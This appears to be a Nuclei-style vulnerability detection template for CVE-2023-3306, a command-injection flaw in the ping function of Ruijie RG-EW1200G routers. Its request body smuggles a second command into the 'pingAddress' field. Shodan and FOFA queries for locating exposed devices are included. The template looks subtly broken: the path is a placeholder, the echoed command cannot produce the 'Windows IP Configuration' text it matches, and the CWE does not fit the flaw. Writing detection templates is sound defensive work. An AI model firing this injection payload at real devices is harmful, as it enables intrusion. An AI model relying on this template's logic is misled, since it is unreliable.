id: CVE-2023-3306

info:
  name: Ruijie RG-EW1200G Command Execution Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  description: |
    A vulnerability in Ruijie RG-EW1200G allows remote attackers to execute arbitrary commands via the ping detection function.
  impact: |
    High: Remote code execution.
  remediation: |
    Apply the vendor-supplied patches or updates.
  reference:
    - https://github.com/RCEraser/cve/blob/main/RG-EW1200G.md
    - https://vuldb.com/?ctiid.231802
    - https://vuldb.com/?id.231802
    - https://github.com/thedarknessdied/CVE-2023-4169_CVE-2023-3306_CVE-2023-4415
    - https://github.com/nomi-sec/PoC-in-GitHub
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L
    cvss-score: 7.3
    cve-id: CVE-2023-3306
    cwe-id: CWE-284
    epss-score: 0.00133
    epss-percentile: 0.4995
    cpe: cpe:2.3:o:ruijie:rg-ew1200g_firmware:ew_3.0\(1\)b11p204:*:*:*:*:*:*:*
  metadata:
    vendor: ruijie
    product: rg-ew1200g_firmware
    shodan-query: http.html:"app.2fe6356cdd1ddd0eb8d6317d1a48d379.css"
    fofa-query: body="app.2fe6356cdd1ddd0eb8d6317d1a48d379.css"

http:
  - method: POST
    path:
      - "{{BaseURL}}/path/to/vulnerable/ping/function"

    body: "pingAddress=127.0.0.1||echo ipconfig"

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "Windows IP Configuration"
        part: body
